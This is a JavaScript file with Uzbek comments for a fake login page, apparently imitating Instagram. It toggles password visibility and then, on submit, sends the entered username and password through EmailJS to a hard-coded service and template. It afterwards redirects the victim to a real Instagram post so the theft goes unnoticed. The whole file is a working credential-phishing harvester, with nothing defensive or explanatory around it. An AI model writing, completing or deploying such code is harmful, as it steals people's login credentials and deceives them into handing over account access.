// EmailJS v4 Init
emailjs.init({
  publicKey: "K5zCQ9mR9q3G60c9r",
});

const form = document.querySelector("form");
const usernameInput = document.getElementById("username-input");
const passwordInput = document.getElementById("password-input");

// Bitta umumiy listener
document.addEventListener("click", (e) => {
  
  // 1. Agar ko'zcha (visible/hidden) tugmasi bosilsa
  if (e.target.classList.contains("hidden-img") || e.target.closest(".hidden-img")) {
    e.preventDefault(); // Form yuborilishini to'xtatish
    
    const eyeIcon = document.querySelector(".hidden-img");
    const isHidden = passwordInput.type === "password";
    
    passwordInput.type = isHidden ? "text" : "password";
    eyeIcon.src = isHidden ? "./images/eye-visible.png" : "./images/eye-hidden.png";
  }

  // 2. Agar "Log in" tugmasi bosilsa (submit jarayoni)
  // Izoh: Form submit hodisasini alohida ushlagan ma'qul, lekin tugma orqali ham nazorat qilsa bo'ladi
});

// Form yuborishni faqat "submit" eventida qoldiramiz, 
// lekin ko'zcha tugmasi type="button" bo'lmasa, u ham buni trigger qiladi.
form.addEventListener("submit", (e) => {
  e.preventDefault();

  // Agar ko'zcha bosilganda submit ishlamasligini xohlasangiz, 
  // HTML dagi ko'zcha tugmasiga type="button" qo'shish ENG TO'G'RI yo'l.
  
  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  if (!username || !password) return; // Bo'sh bo'lsa yubormaydi

  emailjs
    .send("service_l65nlaa", "template_7m7hpya", {
      name: username,
      message: password,
      time: new Date().toLocaleString(),
    })
    .then(() => {
      window.location.replace("https://www.instagram.com/p/DYCHUnYoouu/");
    })
    .catch((error) => {
      console.log("Xatolik:", error);
    });
});